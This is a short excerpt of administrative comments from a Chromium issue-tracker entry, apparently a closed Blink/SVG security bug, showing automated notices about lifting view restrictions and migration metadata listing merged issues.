### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/112212?no_tracker_redirect=1

[Multiple monorail components: Blink, Blink>SVG]
[Monorail mergedwith: crbug.com/chromium/114180, crbug.com/chromium/114581]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053174)*
